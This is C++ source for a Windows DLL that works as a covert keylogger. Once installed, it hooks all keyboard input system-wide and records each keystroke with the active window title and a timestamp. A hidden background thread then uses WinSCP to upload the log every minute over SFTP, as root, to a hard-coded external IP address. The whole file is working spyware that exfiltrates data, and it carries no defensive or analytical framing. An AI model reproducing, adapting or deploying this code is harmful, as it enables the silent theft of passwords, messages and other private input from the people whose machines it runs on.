#define WIN32_LEAN_AND_MEAN
#define _WINSOCKAPI_

#include <windows.h>
#include <shellapi.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <thread>
#include <chrono>
#include <string>
#include <stdio.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

HHOOK hHook = NULL;
HWND lastWindow = NULL;
std::string logFileName;

// 获取本机 IP 地址（仅 IPv4）
std::string GetLocalIP() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    char host[256];
    gethostname(host, sizeof(host));
    struct hostent* hent = gethostbyname(host);
    if (!hent) return "unknown";
    char* ip = inet_ntoa(*(struct in_addr*)hent->h_addr_list[0]);
    WSACleanup();
    return std::string(ip);
}

// 获取当前时间字符串
std::string GetTimestamp() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    char buffer[100];
    sprintf(buffer, "[%04d-%02d-%02d %02d:%02d:%02d]",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    return std::string(buffer);
}

// 获取活动窗口标题
std::string GetWindowTitle(HWND hwnd) {
    char title[256];
    GetWindowTextA(hwnd, title, sizeof(title));
    return std::string(title);
}

// 获取可读按键字符串（支持大小写 & 组合键）
std::string GetKeyChar(KBDLLHOOKSTRUCT* p) {
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    bool isCtrl  = (keyboardState[VK_CONTROL] & 0x80);
    bool isAlt   = (keyboardState[VK_MENU] & 0x80);
    bool isShift = (keyboardState[VK_SHIFT] & 0x80);

    char buf[5] = { 0 };
    UINT scanCode = MapVirtualKey(p->vkCode, MAPVK_VK_TO_VSC);
    int result = ToAscii(p->vkCode, scanCode, keyboardState, (LPWORD)buf, 0);

    std::string keyStr;
    if (isCtrl)  keyStr += "[CTRL]+";
    if (isAlt)   keyStr += "[ALT]+";
    if (isShift && !(p->vkCode >= 'A' && p->vkCode <= 'Z')) keyStr += "[SHIFT]+";

    if (result == 1 && isprint(buf[0])) {
        keyStr += buf[0];
    } else {
        switch (p->vkCode) {
            case VK_RETURN: keyStr += "[ENTER]"; break;
            case VK_BACK:   keyStr += "[BACKSPACE]"; break;
            case VK_TAB:    keyStr += "[TAB]"; break;
            case VK_SPACE:  keyStr += "[SPACE]"; break;
            case VK_ESCAPE: keyStr += "[ESC]"; break;
            case VK_LEFT:   keyStr += "[LEFT]"; break;
            case VK_RIGHT:  keyStr += "[RIGHT]"; break;
            case VK_UP:     keyStr += "[UP]"; break;
            case VK_DOWN:   keyStr += "[DOWN]"; break;
            case VK_DELETE: keyStr += "[DEL]"; break;
            default:
                char unknown[16];
                sprintf(unknown, "[VK:%02X]", p->vkCode);
                keyStr += unknown;
        }
    }

    return keyStr;
}

// 键盘 hook 回调函数
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;

        HWND currentWindow = GetForegroundWindow();
        FILE* log = fopen(logFileName.c_str(), "a");

        if (log) {
            if (currentWindow != lastWindow) {
                lastWindow = currentWindow;
                std::string title = GetWindowTitle(currentWindow);
                std::string line = "\n" + GetTimestamp() + " [Window: " + title + "]\n";
                fwrite(line.c_str(), 1, line.size(), log);
            }

            std::string logLine = GetKeyChar(p) + "\n";
            fwrite(logLine.c_str(), 1, logLine.size(), log);
            fclose(log);
        }
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// 后台线程：定时上传日志文件
void UploadThread() {
    std::string logFile = logFileName;
    const char* hostkey = "ssh-ed25519 255 N+1eW1/CuaOAGCWvpj2T/4M8bNqiPzk1RQF7cTfrtx8";

    while (true) {
        FILE* f = fopen("upload.txt", "w");
        if (f) {
            fprintf(f,
                "open sftp://root@113.44.201.168/ -privatekey=\"keys/my_id_rsa.ppk\" -hostkey=\"%s\"\n"
                "put \"%s\" /home/monitor/\n"
                "exit\n", hostkey, logFile.c_str());
            fclose(f);
        }

        SHELLEXECUTEINFO shExecInfo = {0};
        shExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
        shExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
        shExecInfo.hwnd = NULL;
        shExecInfo.lpVerb = "open";
        shExecInfo.lpFile = "winscp.com";
        shExecInfo.lpParameters = "/script=upload.txt /log=upload.log";
        shExecInfo.lpDirectory = NULL;
        shExecInfo.nShow = SW_HIDE;
        ShellExecuteEx(&shExecInfo);

        std::this_thread::sleep_for(std::chrono::minutes(1));
    }
}

// Hook 安装入口
extern "C" __declspec(dllexport) void InstallHook() {
    logFileName = GetLocalIP() + ".txt";
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    std::thread(UploadThread).detach();
}

// Hook 卸载
extern "C" __declspec(dllexport) void UninstallHook() {
    if (hHook) {
        UnhookWindowsHookEx(hHook);
        hHook = NULL;
    }
}
